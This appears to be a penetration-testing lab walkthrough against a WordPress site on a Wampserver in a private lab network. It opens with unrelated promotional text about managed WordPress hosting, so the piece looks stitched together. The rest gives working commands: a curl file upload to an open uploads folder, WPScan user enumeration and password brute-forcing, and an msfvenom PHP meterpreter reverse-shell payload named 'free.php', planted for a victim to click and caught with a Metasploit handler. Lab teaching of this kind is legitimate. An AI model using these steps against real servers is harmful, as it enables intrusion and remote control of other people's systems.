Managed WordPress hosting is a distinct sub-category of web hosting configured to optimize sites built on this content management system.
WordPress is the world’s most popular CMS, with around 42.5% of all websites using it. This is why many web hosting companies offer managed WordPress hosting services.
Depending on the web host, WordPress hosting can fall under different web hosting categories. For example, different hosting providers may offer Shared WordPress hosting, VPS WordPress hosting, or Cloud WordPress hosting.
The advantages of hosting a WordPress site, there are many benefits to choosing a managed WordPress hosting plan over a regular shared web hosting service plan. Examples of 
Easier Setup -> Pre-installed plugins and themes help create an optimized wordpress host environment, easing technical setups and installations. 
Optimal Performance -> They use a server that has been configured specifically for WordPress sites, often built in caching software is also included to ensure fast loading speed. 
Up-to-date servers and software -> web hosts ensure their wordpress specific servers run the latest software, resulting in optimal compatibility and seamless performance. 
Hassle-free management -> Leave most of the WordPress technicalities to your web hosting plans and focus on other factors like improving search engine optimization strategies. 

After we ran nmap from our Kali Linux on our Windows Server 08, we can see that other ports are open as well, we will now exploit a wordpress site from the list below. 
![open ports](https://user-images.githubusercontent.com/93686063/201990303-3fc5f9b6-b9eb-4d42-8930-7c002deaecaa.JPG)

$`WPScan` is a helpful tool which can help us to enumerate a Wordpress site. It can look for credentials as well as information about the WordPress Site. According to W3Techs, 2022 Wordpress is used by 43.2% of all the websites on the Internet. Two out of every five websites on the Internet use WordPress. WPScan also has a password cracker, it can help check your website for weak authentication credentials. You would need to provide WPScan with a passwrod dictionary of your choosing. 

We will be exploiting the $`Apache httpd 2.2.21 (Win64) PHP/5.3.10 DAV/2` which is in port 8585 for the next exercise. If we type in the $`10.0.2.8:8585` we can see a Wampserver which is used to host a Wordpress website. Now we will see if we can upload anything on the site. First we will test out if we can upload a file into the server. we will do a regular $`echo` command in order to upload a file. $`echo "Hello World" > test.php` After we create the file, now we need to upload the file in the Wamp Server. 

In order to upload the file to the server, we use the $`curl` command. $` curl http://10.0.2.8:8585/uploads/ --upload-file test.php` We go back to the browser and see that the file has been uploaded. A MAJOR SECURITY VULNERABILITY. 
Before we use the WPScan, we need to update the db. After the update we do $`wpscan --url http://10.0.2.8:8585/wordpress -e(enumerate) vp(verbose), u(username)` This will do the scanning, under interesting findings it will have things that we can look for. It will also show users identified and if possible will get the passwords. 
We can now try to get the passwords by adding a dictionary password file. $`wpscan --url http://10.0.2.8:8585/wordpress --passwords /usr/share/wordlists/metasploit/password.lst` It will try to find the password using the values in the password file. You as an attacker will have to play around and see if you can add a different file to find the right password. It did not find any passwords, this is a tedious process so we might have to try different things in order to make sure we get the right. 


$`Now we will try a different method in order to get to the system using MSFVenom`


Now that we know that we can upload a file, we will be using msfvenom in order to get a meterpreter session. We will open a new terminal and first search for a `reverse_tcp`. We will type in $`msfvenom --list payloads | grep php` the grep command will look for payloads which have php on it. When we find it we will type $`msfvenom --payload php/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 > free.php` this is create a payload and save it as `free.php` We will need to upload this `free.php` to the uploads folder so that when somebody clicks on it, then it will connect back to our listener. 

After this we will go back to the msfconsole, $`msf6 > use exploit/multi/handler`. Here we are setting up the listener. We want the user to connect back to me. After this we do options so as to see what parameters we need to set in order to use the exploit. We have to set the $`Rhost` and $`Rport` and we need to add the $`payload options` we will type in set payload options `php/meterpreter/reverse_tcp`. 




